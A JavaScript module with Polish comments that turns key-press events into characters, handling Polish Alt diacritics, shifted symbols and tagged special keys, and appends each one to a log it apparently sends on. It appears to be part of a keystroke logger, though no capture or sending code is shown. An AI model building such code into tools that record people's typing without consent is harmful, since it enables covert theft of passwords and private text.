//pobranie wartosci ze stanów


const log = require('../log.js');
// let alt = false;
// let upperCase = false;

// function returnUpperCase() {
//     const {upperCase: rawUpperCase} = require('./state.js');
//     console.log(rawUpperCase);
//     return rawUpperCase;
// }

/**
 *
 * @description Sprawdza czy stan upperCase jest true, na tej podstawie zwraca różne wartości
 * @param is - wartość która ma zostać zwrócona jeśli upperCase jest true
 * @param isnt - wartość która ma zostać zwrócona jeśli upperCase jest false
 */
function isUpperCase(is, isnt){
    const {upperCase} = require('./state.js');
    return upperCase ? is : isnt
}


/**
 *
 * @description Sprawdza czy stan alta i uppercase jest true, na tej podstawie zwraca różne wartości
 * @param is - wartość która ma zostać zwrócona jeśli alt jest true
 * @param isnt - wartość która ma zostać zwrócona jeśli alt jest false
 */
function isAlt(is, isnt){
    const {alt} = require('./state.js');
    const letterWithAlt = alt ? is : isnt;
    return isUpperCase(letterWithAlt.toUpperCase(), letterWithAlt)
}


// ***** GLOWNY OBIEKT Z ZASADAMI ***** //



/**
 * @description Funkcja szukajaca w obiekcie odpowiedniego klucza i na jej podstawie daje nam ostateczna litere do wyslania
 */
// TODO: Kurka wodna, nie działa
function readRules(data){

    // returnUpperCase();
    // upperCase = returnUpperCase();
    // alt = returnAlt();

    const keyRules = {
        'A': isAlt('ą', 'a'),
        'X': isAlt('ź', 'x'),
        'Z': isAlt('ż', 'z'),
        'L': isAlt('ł', 'l'),
        'O': isAlt('ó', 'o'),
        'C': isAlt('ć', 'c'),
        'E': isAlt('ę', 'e'),
        'S': isAlt('ś', 's'),
        'N': isAlt('ń', 'n'),

        'B': isUpperCase('B', 'b'),
        'D': isUpperCase('D', 'd'),
        'F': isUpperCase('F', 'f'),
        'G': isUpperCase('G', 'g'),
        'H': isUpperCase('H', 'h'),
        'I': isUpperCase('I', 'i'),
        'J': isUpperCase('J', 'j'),
        'K': isUpperCase('K', 'k'),
        'M': isUpperCase('M', 'm'),
        'P': isUpperCase('P', 'p'),
        'R': isUpperCase('R', 'r'),
        'T': isUpperCase('T', 't'),
        'U': isUpperCase('U', 'u'),
        'W': isUpperCase('W', 'w'),
        'Y': isUpperCase('Y', 'y'),
        'Q': isUpperCase('Q', 'q'),
        'V': isUpperCase('V', 'v'),

        'Period': isUpperCase('>', '.'),
        'Comma': isUpperCase('<', ','),
        'Open Bracket': isUpperCase('{', '['),
        'Close Bracket': isUpperCase('}', ']'),
        'Back Slash': isUpperCase('|', '\\'),
        'Semicolon': isUpperCase(':', ';'),
        'Quote': isUpperCase('"', '\''),
        'Slash': isUpperCase('?', '/'),
        'Minus': isUpperCase('_', '-'),
        'Equals': isUpperCase('+', '='),

        'Backspace' : '<backspace>',
        'Space': ' ',
        'Up': '',
        'Right': '',
        'Down': '',
        'Left': '',
        'F1':'[F1]',
        'F2':'[F2]',
        'F3':'[F3]',
        'F4':'[F4]',
        'F5':'[F5]',
        'F6':'[F6]',
        'F7':'[F7]',
        'F8':'[F8]',
        'F9':'[F9]',
        'F10':'[F10]',
        'F11':'[F11]',
        'F12':'[F12]',
        'Insert':'[ins]',
        'Delete':'[del]',
        'End':'[end]',
        'Page Down':'[pUp]',
        'Page Up':'[pDown]',
        'Home':'[home]',
        'Num Lock': '[numLk]',
        'Undefined': '',
        'Print Screen': '[pSc]',
        'Scroll Lock': '[sLk]',
        'Pause': '[pause]',
        'NumPad Divide': '/',
        'NumPad Multiply': '*',
        'NumPad Subtract': '-',
        'NumPad Add': '+',
        'NumPad Separator': '.',
        'NumPad 0': '0',
        'NumPad 1': '1',
        'NumPad 2': '2',
        'NumPad 3': '3',
        'NumPad 4': '4',
        'NumPad 5': '5',
        'NumPad 6': '6',
        'NumPad 7': '7',
        'NumPad 8': '8',
        'NumPad 9': '9',
        'Caps Lock': '[CL]',

        '1': isUpperCase('!', '1'),
        '2': isUpperCase('@', '2'),
        '3': isUpperCase('#', '3'),
        '4': isUpperCase('$', '4'),
        '5': isUpperCase('%', '5'),
        '6': isUpperCase('^', '6'),
        '7': isUpperCase('&', '7'),
        '8': isUpperCase('*', '8'),
        '9': isUpperCase('(', '9'),
        '0': isUpperCase(')', '0'),
    };

    // Jesli key nie jest pusty i tylko na puszczenie klawisza go przepuszczamy
    // if(data.event === "key.released"){ //Zmienilem tutaj z released na pressed, bo shift i alt szybciej reagowaly od znakow
    if(data.event === "key.pressed"){
        // Dodajemy do loga
        log.addToLogMessage(keyRules[data.key]);
    }
}

module.exports.readRules = readRules;
